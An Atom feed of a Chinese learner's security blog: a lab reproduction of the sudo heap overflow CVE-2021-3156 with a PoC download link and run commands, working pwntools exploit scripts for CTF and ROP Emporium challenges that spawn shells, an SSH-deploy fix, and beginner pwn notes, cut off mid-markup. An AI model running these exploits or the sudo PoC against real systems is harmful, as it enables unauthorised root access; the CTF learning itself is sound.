<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Torebtr&#39;blog</title>
  <icon>https://www.gravatar.com/avatar/f4f4d3b79c164ad8f5622d14b77e0d11</icon>
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-03-13T07:59:40.317Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Torebtr</name>
    <email>2338442533@qq.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>cve_2001_3156</title>
    <link href="http://example.com/2021/03/13/cve-2001-3156/"/>
    <id>http://example.com/2021/03/13/cve-2001-3156/</id>
    <published>2021-03-13T07:34:44.000Z</published>
    <updated>2021-03-13T07:59:40.317Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Linux-sudo权限提升漏洞（CVE-2021-3156）复现"><a href="#Linux-sudo权限提升漏洞（CVE-2021-3156）复现" class="headerlink" title="Linux sudo权限提升漏洞（CVE-2021-3156）复现"></a>Linux sudo权限提升漏洞（CVE-2021-3156）复现</h1><h1 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a><strong>漏洞详情</strong></h1><p>2021年01月26日，sudo被披露存在一个基于堆的缓冲区溢出漏洞（CVE-2021-3156，该漏洞被命名为“Baron Samedit”），可导致本地权限提升。当sudo通过-s或-i命令行选项在shell模式下运行命令时，它将在命令参数中使用反斜杠转义特殊字符。但使用-s或 -i标志运行sudoedit时，实际上并未进行转义，从而可能导致缓冲区溢出。只要存在sudoers文件（通常是 /etc/sudoers），攻击者就可以使用本地普通用户利用sudo获得系统root权限。请受影响的用户尽快采取措施进行防护。</p><p><strong>影响范围</strong></p><p>Sudo 1.8.2 - 1.8.31p2</p><p>Sudo 1.9.0 - 1.9.5p1</p><p><strong>测试系统是否易受此漏洞影响：</strong></p><p>\1.  以非root用户身份登录系统。</p><p>\2.  运行命令“sudoedit -s /”</p><p>\3.  如果出现以“ sudoedit：”开头的错误响应，则系统受到此漏洞影响；如果出现以“ usage：”开头的错误响应，则表示该漏洞已被补丁修复。</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="环境：ubuntu20-04虚拟机，sudo-1-8-31"><a href="#环境：ubuntu20-04虚拟机，sudo-1-8-31" class="headerlink" title="环境：ubuntu20.04虚拟机，sudo 1.8.31"></a>环境：ubuntu20.04虚拟机，sudo 1.8.31</h2><h2 id="实现："><a href="#实现：" class="headerlink" title="实现："></a>实现：</h2><p>首先检测是否存在此漏洞</p><p><img src="tupian/1.png" alt="1" loading="lazy"></p><p>版本符合要求，通过运行命令“sudoedit -s /”检测是否真正存在漏洞</p><p><img src="tupian/2.png" alt="2" loading="lazy"></p><p>经检测漏洞存在</p><p>注：版本符合要求，漏洞不一定存在，如：</p><p><img src="tupian/3.png" alt="3" loading="lazy"></p><p>Poc地址:</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://haxx.in/CVE-2021-3156_nss_poc_ubuntu.tar.gz</span><br></pre></td></tr></tbody></table></figure><p>进入目录并执行</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd CVE-2021-3156</span><br><span class="line"></span><br><span class="line">make</span><br><span class="line"></span><br><span class="line">./sudo-hax-me-a-sandwich</span><br></pre></td></tr></tbody></table></figure><p>make并运行文件</p><p><img src="tupian/4.png" alt="4" loading="lazy"></p><p>查看到可用选项，后提升权限<code>./sudo-hax-me-a-sandwich 1</code>                   //结尾的1代表第几个选项<br><img src="tupian/5.png" alt="5" loading="lazy"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Linux-sudo权限提升漏洞（CVE-2021-3156）复现&quot;&gt;&lt;a href=&quot;#Linux-sudo权限提升漏洞（CVE-2021-3156）复现&quot; class=&quot;headerlink&quot; title=&quot;Linux sudo权限提升漏洞（CVE-2021-</summary>
      
    
    
    
    
    <category term="-CVE" scheme="http://example.com/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>mark_of_practice</title>
    <link href="http://example.com/2021/03/13/mark-of-practice/"/>
    <id>http://example.com/2021/03/13/mark-of-practice/</id>
    <published>2021-03-13T07:33:44.000Z</published>
    <updated>2021-03-13T07:58:17.155Z</updated>
    
    <content type="html"><![CDATA[<p>最近在入门堆，但是基础实在有点多，可是不会基础的话又看不懂题，所以堆的题也没怎么搞，只能刷点简单题来水，生活不易啊。</p><h2 id="ret2libc：buu-ciscn-2019-en-2"><a href="#ret2libc：buu-ciscn-2019-en-2" class="headerlink" title="ret2libc：buu ciscn_2019_en_2"></a>ret2libc：buu ciscn_2019_en_2</h2><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os=<span class="string">'linux'</span> </span><br><span class="line">context.arch=<span class="string">'amd64'</span> </span><br><span class="line">context.log_level=<span class="string">'debug'</span> </span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">26863</span>)</span><br><span class="line"><span class="comment">#p = process('./ciscn_2019_en_2')</span></span><br><span class="line">elf = ELF(<span class="string">'./ciscn_2019_en_2'</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">main_addr = <span class="number">0x400B28</span></span><br><span class="line"><span class="comment">#ROPgadget查找</span></span><br><span class="line">ret = <span class="number">0x00400C84</span></span><br><span class="line">pop_rdi = <span class="number">0x00400c83</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'choice!\n'</span>,<span class="string">'1'</span>)</span><br><span class="line"><span class="comment">#payload = flat(['\0', 'a'*0x57, pop_di, puts_got, puts_plt, main_addr])</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x58</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">p.sendlineafter(<span class="string">'encrypted\n'</span>,payload)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="comment">#puts_addr = u64(r.recv(8))</span></span><br><span class="line">puts_addr=u64(p.recvuntil(<span class="string">'\n'</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line"><span class="comment">#puts_addr= u64(r.recvline()[:-1].ljust(8, '\x00'))</span></span><br><span class="line"><span class="comment">#print(puts_addr)</span></span><br><span class="line"><span class="comment">#print(hex(puts_addr))</span></span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>, puts_addr)</span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">sys_addr = libcbase + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'choice!\n'</span>,<span class="string">'1'</span>)</span><br><span class="line"><span class="comment">#payload = flat(['\0', 'a'*0x57, ret,  pop_di, binsh_addr, sys_addr])</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x58</span>+ p64(ret)+  p64(pop_rdi)+ p64(binsh_addr)+ p64(sys_addr)</span><br><span class="line">p.sendlineafter(<span class="string">'encrypted\n'</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure><h2 id="水题：bjdctf-2020-babystack"><a href="#水题：bjdctf-2020-babystack" class="headerlink" title="水题：bjdctf_2020_babystack"></a>水题：bjdctf_2020_babystack</h2><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">26025</span>)</span><br><span class="line">shell_addr=<span class="number">0x4006e6</span></span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">'100'</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(shell_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure><h2 id="HarekazeCTF2019-baby-rop"><a href="#HarekazeCTF2019-baby-rop" class="headerlink" title="[HarekazeCTF2019]baby_rop"></a>[HarekazeCTF2019]baby_rop</h2><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">'debug'</span>, arch = <span class="string">'i386'</span>, os = <span class="string">'linux'</span>)</span><br><span class="line"><span class="comment">#p = process('./babyrop')</span></span><br><span class="line">p = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">26310</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x00400683 : pop rdi ; ret</span></span><br><span class="line">pop_rdi = <span class="number">0x00400683</span></span><br><span class="line">sys_addr = <span class="number">0x004005E3</span></span><br><span class="line">bin_sh_addr = <span class="number">0x00601048</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x18</span> + p64(pop_rdi) + p64(bin_sh_addr) + p64(sys_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure><h2 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a>ciscn_2019_n_5</h2><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>, log_level = <span class="string">'debug'</span>)</span><br><span class="line"><span class="comment">#sh = process('./ciscn_2019_n_5')</span></span><br><span class="line">sh = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">25696</span>)</span><br><span class="line">elf = ELF(<span class="string">'./ciscn_2019_n_5'</span>)</span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x601080</span></span><br><span class="line"><span class="comment">#shellcode ="\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="comment">#生成64位linuxshellcode</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x28</span> + p64(bss_addr)</span><br><span class="line"><span class="comment">#栈溢出ret到shellcode执行</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">"name\n"</span>,shellcode)</span><br><span class="line">sh.sendlineafter(<span class="string">"me?\n"</span>,payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近在入门堆，但是基础实在有点多，可是不会基础的话又看不懂题，所以堆的题也没怎么搞，只能刷点简单题来水，生活不易啊。&lt;/p&gt;
&lt;h2 id=&quot;ret2libc：buu-ciscn-2019-en-2&quot;&gt;&lt;a href=&quot;#ret2libc：buu-ciscn-2019-en</summary>
      
    
    
    
    <category term="从0开始" scheme="http://example.com/categories/%E4%BB%8E0%E5%BC%80%E5%A7%8B/"/>
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>problem_blog</title>
    <link href="http://example.com/2021/03/13/problem-blog/"/>
    <id>http://example.com/2021/03/13/problem-blog/</id>
    <published>2021-03-13T07:32:22.000Z</published>
    <updated>2021-03-13T07:58:36.728Z</updated>
    
    <content type="html"><![CDATA[<p>由于本人博客搭在虚拟机上，而虚拟机又经常出事，很不幸，爷碰上了。。。。。。。。。</p><p>起因的的图片没了，大概就是我要更新博客，把md文件放上去之后，本地部署毫无问题，上传到远程的时候出事了，让我确认是否有远程仓库，给爷整蒙了。</p><p>刚开始以为是ssh的原因，我重新生成，然后把原来的删掉了，然后添加了新的具体过程如下：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C "youremail@example.com"</span><br></pre></td></tr></tbody></table></figure><p>在本地生成 .ssh 文件夹，然后复制其中的id_rsa.pub中的内容放到github中setting上的SSH中</p><p>这就添加完毕了，然后验证</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com # github地址</span><br></pre></td></tr></tbody></table></figure><p>如果提示<code>Are you sure you want to continue connecting (yes/no)?</code>，输入yes，然后会看到：</p><blockquote><p>Hi liuxianan! You’ve successfully authenticated, but GitHub does not provide shell access.</p></blockquote><p>看到这个信息说明SSH已配置成功！</p><p>而我的就没有，显示</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Permission denied</span><br></pre></td></tr></tbody></table></figure><p>很无奈，后来查百度后发现是自己的本机的这个git仓库并没有和这个SSH key 关联上</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh-agent bash</span><br><span class="line">ssh-add "/home/ubuntu/.ssh/id_rsa"</span><br></pre></td></tr></tbody></table></figure><p>回显</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Identity added: /home/ubuntu/.ssh/id_rsa (/home/ubuntu/.ssh/id_rsa)</span><br></pre></td></tr></tbody></table></figure><p>然后hexo d成功部署</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;由于本人博客搭在虚拟机上，而虚拟机又经常出事，很不幸，爷碰上了。。。。。。。。。&lt;/p&gt;
&lt;p&gt;起因的的图片没了，大概就是我要更新博客，把md文件放上去之后，本地部署毫无问题，上传到远程的时候出事了，让我确认是否有远程仓库，给爷整蒙了。&lt;/p&gt;
&lt;p&gt;刚开始以为是ssh的原</summary>
      
    
    
    
    <category term="从0开始" scheme="http://example.com/categories/%E4%BB%8E0%E5%BC%80%E5%A7%8B/"/>
    
    
    <category term="problems" scheme="http://example.com/tags/problems/"/>
    
  </entry>
  
  <entry>
    <title>第一次讲课</title>
    <link href="http://example.com/2021/03/13/%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%AE%B2%E8%AF%BE/"/>
    <id>http://example.com/2021/03/13/%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%AE%B2%E8%AF%BE/</id>
    <published>2021-03-13T07:29:16.000Z</published>
    <updated>2021-03-13T07:58:12.783Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwn入门"><a href="#pwn入门" class="headerlink" title="pwn入门"></a>pwn入门</h1><h2 id="什么是pwn"><a href="#什么是pwn" class="headerlink" title="什么是pwn"></a>什么是pwn</h2><p>Pwn可以简单概括为软件的漏洞的挖掘和利用（二进制攻防）。</p><h2 id="涉及到的知识"><a href="#涉及到的知识" class="headerlink" title="涉及到的知识"></a>涉及到的知识</h2><p>涉及计算机学科的众多方向，而且大多偏底层。包括不限于，C语言，C++，python，数 据结构，计算机组成原理，操作系统，编译原理，计算机网络等。</p><h2 id="linux基础"><a href="#linux基础" class="headerlink" title="linux基础"></a>linux基础</h2><p>虚拟机：Ubuntu版本不限（但是以后做题的时候会用到不同版本的Ubuntu，具体题目具体分析）</p><p>基本命令：</p><h3 id="ls命令-dir"><a href="#ls命令-dir" class="headerlink" title="ls命令 dir"></a>ls命令 dir</h3><p>就是 list 的缩写，通过 ls 命令不仅可以查看 linux 文件夹包含的文件，而且可以查看文件权限(包括目录、文件夹、文件权限)查看目录信息等等。</p><h3 id="cd-命令"><a href="#cd-命令" class="headerlink" title="cd 命令"></a>cd 命令</h3><p>cd(changeDirectory) 命令语法：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd [目录名] </span><br></pre></td></tr></tbody></table></figure><p>说明：切换当前目录至 dirName。</p><h3 id="mkdir-filename"><a href="#mkdir-filename" class="headerlink" title="mkdir  filename"></a>mkdir  filename</h3><p>创建文件夹。</p><h3 id="sudo-apt-get-install-python"><a href="#sudo-apt-get-install-python" class="headerlink" title="sudo apt-get install  python"></a>sudo apt-get install  python</h3><p>安装。（只能安装库中有的软件程序）</p><p>sudo apt-get update</p><p>sudo apt-get upgrade</p><ul><li>安装 git，gdb </li></ul><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install git </span><br><span class="line">sudo apt-get install gdb </span><br></pre></td></tr></tbody></table></figure><ul><li><p>pip安装</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python3-pip</span><br></pre></td></tr></tbody></table></figure></li><li><p>安装pwntools</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install pwntools</span><br></pre></td></tr></tbody></table></figure></li></ul><h2 id="PWN类型"><a href="#PWN类型" class="headerlink" title="PWN类型"></a>PWN类型</h2><p>栈漏洞，<strong>堆漏洞</strong>，格式化字符串漏洞，整型漏洞，<strong>逻辑漏洞</strong></p><p>buuctf   第二排第三个  level0</p><p><img src="https://image.3001.net/images/20180803/1533302977_5b6458c1e6d51.png!small" alt="push_pop.png" loading="lazy"></p><p><img src="https://img-blog.csdn.net/20180823164911166?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NvdW5zZWxsb3I=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述" loading="lazy"></p><h1 id="cat-flag-system-‘bin-sh’"><a href="#cat-flag-system-‘bin-sh’" class="headerlink" title="cat flag   system(‘bin/sh’)"></a>cat flag   system(‘bin/sh’)</h1><p>0x20</p><h1 id="ROP-Emporium"><a href="#ROP-Emporium" class="headerlink" title="ROP Emporium"></a>ROP Emporium</h1><h2 id="ret2win"><a href="#ret2win" class="headerlink" title="ret2win"></a><a href="https://ropemporium.com/challenge/ret2win.html">ret2win</a></h2><h3 id="测偏移"><a href="#测偏移" class="headerlink" title="测偏移"></a>测偏移</h3><p>cyclic 0x32</p><p><img src="C:\Users\toreb\AppData\Roaming\Typora\typora-user-images\image-20201107143639149.png" alt="image-20201107143639149" loading="lazy"></p><p>cyclic(0x32).find(‘kaaalaaam’)</p><p><img src="C:\Users\toreb\AppData\Roaming\Typora\typora-user-images\image-20201107143659414.png" alt="image-20201107143659414" loading="lazy"></p><p><img src="C:\Users\toreb\AppData\Roaming\Typora\typora-user-images\image-20201107143749971.png" alt="image-20201107143749971" loading="lazy"></p><p>找到system函数地址</p><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./ret2win'</span>)</span><br><span class="line">p = remote(<span class="string">''</span>,***)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x0400824</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">40</span>+p64(system_addr)   <span class="comment">#0x20+8</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure><h2 id="split"><a href="#split" class="headerlink" title="split"></a>split</h2><h3 id="x64传参方式："><a href="#x64传参方式：" class="headerlink" title="x64传参方式："></a>x64传参方式：</h3><p>当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。<br>当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样</p><p><img src="C:\Users\toreb\AppData\Roaming\Typora\typora-user-images\image-20201107150942904.png" alt="image-20201107150058709" loading="lazy"></p><p>需要bin/sh或者cat flag</p><p><img src="C:\Users\toreb\AppData\Roaming\Typora\typora-user-images\image-20201107151048320.png" alt="image-20201107151048320" loading="lazy"></p><p>测偏移，详情见上题</p><p>使用ROPgadget</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./split --only'pop|ret'</span><br></pre></td></tr></tbody></table></figure><p><img src="C:\Users\toreb\AppData\Roaming\Typora\typora-user-images\image-20201107151349027.png" alt="image-20201107151349027" loading="lazy"></p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process('./split')</span><br><span class="line">#elf = ELF('./split')</span><br><span class="line"></span><br><span class="line">system_addr = 0x00400810</span><br><span class="line">#system_addr = elf.symbols['system']</span><br><span class="line">cat_flag_addr = 0x00601060</span><br><span class="line">pop_rdi_ret = 0x00400883</span><br><span class="line"></span><br><span class="line">payload = 'A'*40+p64(pop_rdi_ret)+p64(cat_flag_addr)+p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure><h1 id="callme"><a href="#callme" class="headerlink" title="callme"></a>callme</h1><h1 id="IDA-启动！"><a href="#IDA-启动！" class="headerlink" title="IDA 启动！"></a>IDA 启动！</h1><h2 id="2-1字符串分析"><a href="#2-1字符串分析" class="headerlink" title="2.1字符串分析"></a>2.1字符串分析</h2><p><img src="https://upload-images.jianshu.io/upload_images/19933986-a2ddb2c465590796.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/484/format/webp" alt="img" loading="lazy"></p><p>IDA_字符串检查</p><ul><li><p>libcallme.so : 之前文件夹里面的libcallme库</p></li><li><p>callme one/two/three : 可能为libcallme中的函数</p><p><img src="https://upload-images.jianshu.io/upload_images/19933986-1812408b7cae7c38.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/336/format/webp" alt="img" loading="lazy"></p><p>usefulFuction</p><p>这个函数使得我们可以调用callme one/two/three,并且得知这三个函数分别需要三个参数</p></li></ul><h2 id="2-2-libcallme-so"><a href="#2-2-libcallme-so" class="headerlink" title="2.2 libcallme.so"></a>2.2 libcallme.so</h2><p><img src="https://upload-images.jianshu.io/upload_images/19933986-550e0e8594c53057.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/380/format/webp" alt="img" loading="lazy"></p><p>libcallme</p><p>果然，三个函数在这里</p><h3 id="2-2-1函数分析"><a href="#2-2-1函数分析" class="headerlink" title="2.2.1函数分析"></a>2.2.1函数分析</h3><h5 id="1-callme-one"><a href="#1-callme-one" class="headerlink" title="1.callme_one"></a>1.callme_one</h5><p><img src="https://upload-images.jianshu.io/upload_images/19933986-253eb2030644bf53.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/950/format/webp" alt="img" loading="lazy"></p><p>callme_one</p><p>发现它的作用是读取已经加密了的flag.txt</p><h5 id="2-callme-two"><a href="#2-callme-two" class="headerlink" title="2.callme_two"></a>2.callme_two</h5><p><img src="https://upload-images.jianshu.io/upload_images/19933986-903ccdc6912d90d3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/860/format/webp" alt="img" loading="lazy"></p><p>callme_two</p><p>发现是利用key1.dat进行一些解密工作</p><h5 id="3-callme-three"><a href="#3-callme-three" class="headerlink" title="3.callme_three"></a>3.callme_three</h5><p><img src="https://upload-images.jianshu.io/upload_images/19933986-58467b2b4a75cfba.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/879/format/webp" alt="img" loading="lazy"></p><p>callme_three</p><p>和callme_two差不多，也是进行解密工作</p><h2 id="2-3分析漏洞点函数"><a href="#2-3分析漏洞点函数" class="headerlink" title="2.3分析漏洞点函数"></a>2.3分析漏洞点函数</h2><p><img src="https://upload-images.jianshu.io/upload_images/19933986-70d75cdbe6043da0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/441/format/webp" alt="img" loading="lazy"></p><p>pwnme</p><p>是pwnme函数的一个fgets溢出漏洞<br> 同样得到偏移值0x20+8</p><h2 id="2-4查看plt表"><a href="#2-4查看plt表" class="headerlink" title="2.4查看plt表"></a>2.4查看plt表</h2><p><img src="https://upload-images.jianshu.io/upload_images/19933986-216b716954cdd11a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1048/format/webp" alt="img" loading="lazy"></p><p>plt表</p><p>得到地址</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">callme_one = 0x401850</span><br><span class="line">callme_two = 0x401870</span><br><span class="line">callme_three = 0x401810</span><br></pre></td></tr></tbody></table></figure><h1 id="3-开启了NX保护，而且使用了动态链接库，所以"><a href="#3-开启了NX保护，而且使用了动态链接库，所以" class="headerlink" title="3.开启了NX保护，而且使用了动态链接库，所以"></a>3.开启了NX保护，而且使用了动态链接库，所以</h1><h2 id="3-1思路"><a href="#3-1思路" class="headerlink" title="3.1思路"></a>3.1思路</h2><ul><li>使用ROP实现跳转</li><li>使用plt表调用函数<br>关于plt表：<a href="https://links.jianshu.com/go?to=https://blog.csdn.net/qq_18661257/article/details/54694748">GOT表和PLT表知识详解</a></li></ul><blockquote><p>PLT表中的每一项的数据内容都是对应的GOT表中一项的地址这个是固定不变的，到这里大家也知道了PLT表中的数据根本不是函数的真实地址，而是GOT表项的地址</p></blockquote><blockquote><p>其实在大家进入带有@plt标志的函数时，这个函数其实就是个过渡作用，因为GO表项中的数据才是函数最终的地址，而PLT表中的数据又是GOT表项的地址，我们就可以通过PLT表跳转到GOT表来得到函数真正的地址。</p></blockquote><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td 